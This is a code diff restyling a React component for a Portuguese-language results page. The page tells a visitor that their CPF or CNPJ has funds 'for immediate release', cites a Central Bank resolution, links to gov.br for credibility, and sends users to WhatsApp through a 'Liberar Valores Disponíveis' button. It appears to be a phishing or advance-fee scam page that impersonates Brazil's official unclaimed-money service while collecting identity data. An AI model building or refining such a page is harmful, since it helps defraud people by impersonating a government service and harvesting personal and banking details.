@@ -170,49 +170,48 @@ export function Step2({ data, onReset }: Step2Props) {
           animate={{ opacity: 1, y: 0 }}
           className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] w-full max-w-[880px] mx-auto shadow-md transition-colors duration-300"
         >
-            {/* Layout Container */}
-            <div className="p-8 md:p-16 flex flex-col md:flex-row gap-10 md:gap-16">
+            {/* Image 3 Style Structure */}
+            <div className="p-10 md:p-16 flex flex-col md:flex-row items-start md:items-center gap-10 md:gap-20">
               
-              {/* Left Column: Checkmark (Centered on Mobile, End-aligned on Desktop) */}
-              <div className="w-full md:w-[25%] flex justify-center md:justify-end">
-                <div className="w-24 h-24 md:w-44 md:h-44">
+              {/* Left Side: Large Checkmark */}
+              <div className="flex-shrink-0 w-full md:w-auto flex justify-center">
+                <div className="w-32 h-32 md:w-48 md:h-48">
                   <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
                     <path 
                       fill="none" 
                       stroke="currentColor" 
-                      strokeWidth="3.5" 
+                      strokeWidth="3" 
                       strokeLinecap="round" 
                       strokeLinejoin="round" 
                       d="M14 27l8 8 16-16" 
-                      className="drop-shadow-sm"
                     />
                   </svg>
                 </div>
               </div>
 
-              {/* Right Column: Content (Centered on Mobile, Start-aligned on Desktop) */}
-              <div className="w-full md:w-[75%] space-y-8 text-center md:text-left">
+              {/* Right Side: Content */}
+              <div className="flex-grow space-y-8">
                 
-                {/* Title and Identification */}
+                {/* Identification Header */}
                 <div className="space-y-4">
-                  <h2 className="text-[24px] md:text-[36px] font-bold text-[#455a64] dark:text-white leading-tight tracking-tight">
+                  <h2 className="text-[26px] md:text-[38px] font-bold text-[#455a64] dark:text-white leading-tight">
                     O {data.docType} pesquisado possui ativos para liberação imediata
                   </h2>
-                  <div className="text-[15px] md:text-[17px] text-[#666] dark:text-gray-400 flex flex-col items-center md:items-start font-medium space-y-1">
-                     <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.docValue}</span></p>
-                     <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.birthDate}</span></p>
+                  <div className="text-[15px] md:text-[18px] text-[#444] dark:text-gray-300 font-medium">
+                     <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold">{data.docValue}</span></p>
+                     <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold">{data.birthDate}</span></p>
                   </div>
                 </div>
 
-                {/* Resolution Box */}
-                <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-5 md:p-6 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-sm shadow-inner">
-                  <p className="text-[16px] md:text-[18px] font-bold text-[#444] dark:text-gray-100">
+                {/* Highlighted Instruction Box (Gray) */}
+                <div className="bg-[#f0f2f5] dark:bg-[#2c3e50] p-5 md:p-6 rounded-sm border-l-4 border-gray-400">
+                  <p className="text-[15px] md:text-[18px] font-bold text-[#455a64] dark:text-gray-100">
                     O procedimento de resgate está sujeito à validação de segurança conforme a Resolução BCB nº 4.862/2020.
                   </p>
                 </div>
 
-                {/* Juridical Descriptions */}
-                <div className="space-y-5 text-[16px] md:text-[18px] text-[#444] dark:text-gray-300 leading-relaxed font-normal">
+                {/* Descriptions */}
+                <div className="space-y-5 text-[15px] md:text-[17px] text-[#555] dark:text-gray-300 leading-relaxed">
                   <p>
                     Para garantir a integridade da transferência fiscal, o sistema exige a conclusão das etapas obrigatórias de homologação documental e vínculo bancário do titular.
                   </p>
@@ -221,32 +220,34 @@ export function Step2({ data, onReset }: Step2Props) {
                   </p>
                 </div>
 
-                {/* Action Buttons Row */}
-                <div className="pt-6 flex flex-col gap-5">
-                  <div className="flex flex-col md:flex-row md:justify-end gap-4 w-full">
-                    <button
-                      onClick={handleWhatsAppRedirect}
-                      className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3.5 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[16px] md:text-[18px] shadow-md uppercase order-1 md:order-none w-full md:w-auto min-w-[280px]"
-                    >
-                      <ArrowRight size={20} className="-rotate-45" /> Liberar Valores Disponíveis
-                    </button>
-                    <button
-                      onClick={onReset}
-                      className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm order-2 md:order-none w-full md:w-auto"
-                    >
-                      <Search size={20} /> Nova consulta
-                    </button>
-                    <button
-                      onClick={() => window.location.reload()}
-                      className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm order-3 md:order-none w-full md:w-auto"
-                    >
-                      <X size={20} /> Sair
-                    </button>
-                  </div>
+                {/* Primary Action Button (Liberar) */}
+                <div className="pt-4">
+                   <button
+                    onClick={handleWhatsAppRedirect}
+                    className="w-full md:w-auto bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-4 px-12 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] md:text-[18px] shadow-sm uppercase tracking-wide"
+                  >
+                    <ArrowRight size={22} className="-rotate-45" /> Liberar Valores Disponíveis
+                  </button>
                 </div>
 
-                {/* Footer Gov.br Link */}
-                <div className="pt-10 border-t border-gray-100 dark:border-gray-800 text-center w-full">
+                {/* Secondary Action Buttons Row (Image 3 Style) */}
+                <div className="flex flex-col md:flex-row gap-4 pt-2">
+                  <button
+                    onClick={onReset}
+                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm"
+                  >
+                    <Search size={18} /> Nova consulta
+                  </button>
+                  <button
+                    onClick={() => window.location.reload()}
+                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm"
+                  >
+                    <X size={18} /> Sair
+                  </button>
+                </div>
+
+                {/* Footer Link */}
+                <div className="pt-10 border-t border-gray-100 dark:border-gray-800 text-center md:text-left">
                   <a 
                     href="https://acesso.gov.br" 
                     target="_blank" 
